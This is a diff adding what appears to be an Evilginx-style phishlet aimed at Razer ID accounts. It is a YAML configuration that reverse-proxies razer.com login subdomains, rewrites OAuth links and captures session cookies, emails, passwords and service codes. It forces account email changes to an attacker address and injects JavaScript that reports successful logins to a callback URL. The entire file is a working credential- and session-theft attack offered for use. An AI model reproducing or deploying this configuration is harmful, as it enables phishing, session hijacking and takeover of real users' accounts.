@@ -1,0 +1,58 @@
+author: '@hash3liZer'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'razer.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'razer.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'razerid', orig_sub: 'razerid', domain: 'razer.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'oauth2', orig_sub: 'oauth2', domain: 'razer.com', session: true, is_landing: false, auto_filter: false}
+sub_filters:
+  - {triggers_on: 'razerid.razer.com', orig_sub: 'razerid', domain: 'razer.com', search: 'oauth2.razer.com', replace: 'oauth2.{domain}', mimes: ['text/html']}
+  - {triggers_on: 'razerid.razerid.com:443', orig_sub: 'razerid', domain: 'razer.com', search: 'oauth2.razer.com', replace: 'oauth2.{domain}', mimes: ['text/html']}
+auth_tokens:
+  - domain: 'razerid.razer.com'
+    keys: ['AWSALB', 'PHPSESSID']
+  - domain: '.razer.com'
+    keys: ['AWSALB,opt', 'PHPSESSID,opt']
+credentials: 
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'serviceCode'
+      search: '(.*)'
+      type: 'post'
+auth_urls:
+  - '/account'
+login:
+  domain: 'razerid.razer.com'
+  path: '/'
+force_post:
+  - path: '/ajax/user-email-update'
+    search:
+      - {key: 'email', search: '.*'}
+      - {key: 'method', search: '.*'}
+    force:
+      - {key: 'email', value: 'yourbackup@domain.tld'}
+js_inject:
+  - trigger_domains: [ 'razerid.razer.com' ]
+    trigger_paths: [ '.*?' ]
+    script: |
+      var backURL = "";
+
+      function verifyLogin(){
+        var toCheck = document.getElementsByClassName( "account-item" );
+        if( toCheck.length > 1 ){
+          if(backURL != ""){
+            var xhttp = new XMLHttpRequest();
+            xhttp.open( "POST", backURL, true );
+            xhttp.send();
+          }
+        }
+      }
+
+      setInterval(verifyLogin, 2000);
